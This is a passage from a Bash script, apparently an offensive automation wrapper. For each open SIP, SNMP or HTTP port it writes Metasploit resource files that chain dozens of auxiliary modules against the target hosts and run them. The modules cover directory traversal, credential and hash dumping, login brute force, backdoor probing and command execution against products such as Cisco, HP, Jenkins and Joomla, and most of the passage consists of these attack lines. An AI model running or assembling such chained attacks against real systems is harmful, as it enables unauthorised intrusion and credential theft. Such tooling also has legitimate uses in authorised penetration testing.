use auxiliary/scanner/scada/digi_realport_serialport_scan
use auxiliary/scanner/scada/digi_realport_version
use auxiliary/scanner/scada/indusoft_ntwebserver_fileaccess
use auxiliary/scanner/scada/koyo_login
use auxiliary/scanner/scada/modbus_findunitid
use auxiliary/scanner/scada/modbusclient
use auxiliary/scanner/scada/modbusdetect
use auxiliary/scanner/scada/moxa_discover
use auxiliary/scanner/scada/profinet_siemens
use auxiliary/scanner/scada/sielco_winlog_fileaccess
scada
	fi
	#sip
	if echo "${var[@]}" | grep -w "5060" &>/dev/null; then
	echo "use auxiliary/scanner/sip/enumerator" >> sip.rc
	echo "set RHOSTS $RHOSTS" >>sip.rc
	echo "exploit" >>sip.rc
	echo "back" >>sip.rc
	echo "use auxiliary/scanner/sip/enumerator_tcp" >> sip.rc
	echo "set RHOSTS $RHOSTS" >>sip.rc
	echo "exploit" >>sip.rc
	echo "back" >>sip.rc
	echo "use auxiliary/scanner/sip/options" >> sip.rc
	echo "set RHOSTS $RHOSTS" >>sip.rc
	echo "exploit" >>sip.rc
	echo "back" >>sip.rc
	echo "use auxiliary/scanner/sip/options_tcp" >> sip.rc
	echo "set RHOSTS $RHOSTS" >>sip.rc
	echo "exploit" >>sip.rc
	echo "back" >>sip.rc
	echo "use auxiliary/scanner/sip/sipdroid_ext_enum" >> sip.rc
	echo "set RHOSTS $RHOSTS" >>sip.rc
	echo "exploit" >>sip.rc
	echo "back" >>sip.rc
<<sip	
use auxiliary/scanner/sip/enumerator
use auxiliary/scanner/sip/enumerator_tcp
use auxiliary/scanner/sip/options
use auxiliary/scanner/sip/options_tcp
use auxiliary/scanner/sip/sipdroid_ext_enum
sip
	fi
	#snmp
	if echo "${var[@]}" | (grep -w "161" -o  grep -w "162")&>/dev/null; then  #snmp get UDP 161  snmp trap udp 162 
	echo "use auxiliary/scanner/snmp/aix_version" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/arris_dg950" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/brocade_enumhash" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/cisco_config_tftp" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/cisco_upload_file" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/cnpilot_r_snmp_loot" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/epmp1000_snmp_loot" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/netopia_enum" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/sbg6580_enum" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/snmp_enum" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/snmp_enum_hp_laserjet" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/snmp_enumshares" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/snmp_enumusers" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/snmp_login" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/snmp_set" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/ubee_ddw3611" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
	echo "use auxiliary/scanner/snmp/xerox_workcentre_enumusers" >> snmp.rc
	echo "set RHOSTS $RHOSTS" >>snmp.rc
	echo "exploit" >>snmp.rc
	echo "back" >>snmp.rc
<<snmp	
use auxiliary/scanner/snmp/aix_version
use auxiliary/scanner/snmp/arris_dg950
use auxiliary/scanner/snmp/brocade_enumhash
use auxiliary/scanner/snmp/cisco_config_tftp
use auxiliary/scanner/snmp/cisco_upload_file
use auxiliary/scanner/snmp/cnpilot_r_snmp_loot
use auxiliary/scanner/snmp/epmp1000_snmp_loot
use auxiliary/scanner/snmp/netopia_enum
use auxiliary/scanner/snmp/sbg6580_enum
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enum_hp_laserjet
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/snmp_set
use auxiliary/scanner/snmp/ubee_ddw3611
use auxiliary/scanner/snmp/xerox_workcentre_enumusers
snmp
	fi
	#http
	if echo "${var[@]}" | (grep -w "80" -o grep -w "8080") &>/dev/null; then  
	echo "use auxiliary/scanner/http/a10networks_ax_directory_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/accellion_fta_statecode_file_read" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/adobe_xml_inject" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/advantech_webaccess_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/allegro_rompager_misfortune_cookie" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/apache_activemq_source_disclosure" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/apache_activemq_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/apache_mod_cgi_bash_env" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/apache_optionsbleed" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/apache_userdir_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/appletv_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/atlassian_crowd_fileaccess" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/axis_local_file_include" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/axis_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/backup_file" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/barracuda_directory_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/bavision_cam_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/binom3_login_config_pass_dump" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/bitweaver_overlay_type_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/blind_sql_query" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/bmc_trackit_passwd_reset" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/brute_dirs" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/buffalo_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/buildmaster_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/caidao_bruteforce_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/canon_wireless" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cert" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/chef_webui_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/chromecast_webserver" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/chromecast_wifi" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_asa_asdm" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_device_manager" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_firepower_download" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_firepower_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_ios_auth_bypass" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_ironport_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_nac_manager_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_ssl_vpn" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cisco_ssl_vpn_priv_esc" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/clansphere_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/cnpilot_r_web_login_loot" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/coldfusion_locale_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/coldfusion_version" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/concrete5_member_list" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/copy_of_file" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/crawler" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dell_idrac" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dir_listing" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dir_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dir_webdav_unicode_bypass" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/directadmin_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dlink_dir_300_615_http_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dlink_dir_615h_http_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dlink_dir_session_cgi_http_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dlink_user_agent_backdoor" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dnalims_file_retrieve" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/docker_version" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/dolibarr_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/drupal_views_user_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/ektron_cms400net" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/elasticsearch_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/enum_wayback" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/epmp1000_dump_config" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/epmp1000_dump_hashes" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/epmp1000_get_chart_cmd_exec" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/epmp1000_ping_cmd_exec" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/epmp1000_reset_pass" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/epmp1000_web_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/error_sql_injection" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/etherpad_duo_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/f5_bigip_virtual_server" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/f5_mgmt_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/file_same_name_dir" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/files_dir" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/frontpage_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/gavazzi_em_login_loot" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/git_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/gitlab_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/gitlab_user_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/glassfish_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/goahead_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/groupwise_agents_http_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/host_header_injection" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_imc_bims_downloadservlet_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_imc_faultdownloadservlet_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_imc_ictdownloadservlet_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_imc_reportimgservlt_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_imc_som_file_download" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_sitescope_getfileinternal_fileaccess" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_sitescope_getsitescopeconfiguration" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_sitescope_loadfilecontent_fileaccess" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/hp_sys_mgmt_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/http_header" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/http_hsts" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/http_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/http_put" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/http_sickrage_password_leak" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/http_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/http_version" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/httpbl_lookup" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/httpdasm_directory_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/iis_internal_ip" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/influxdb_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/infovista_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/intel_amt_digest_bypass" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/ipboard_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/jboss_status" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/jboss_vulnscan" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/jenkins_command" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/jenkins_enum" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/jenkins_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/joomla_bruteforce_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/joomla_gallerywd_sqli_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/joomla_pages" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/joomla_plugins" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/joomla_version" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/kodi_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/linknat_vos_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/linksys_e1500_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/litespeed_source_disclosure" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/lucky_punch" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/majordomo2_directory_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/manageengine_desktop_central_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/manageengine_deviceexpert_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/manageengine_deviceexpert_user_creds" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/manageengine_securitymanager_traversal" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/mediawiki_svg_fileaccess" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/meteocontrol_weblog_extractadmin" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/mod_negotiation_brute" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/mod_negotiation_scanner" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/ms15_034_http_sys_memory_dump" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/mybook_live_login" >> http.rc
	echo "set RHOSTS $RHOSTS" >>http.rc
	echo "exploit" >>http.rc
	echo "back" >>http.rc
	echo "use auxiliary/scanner/http/netdecision_traversal" >> http.rc
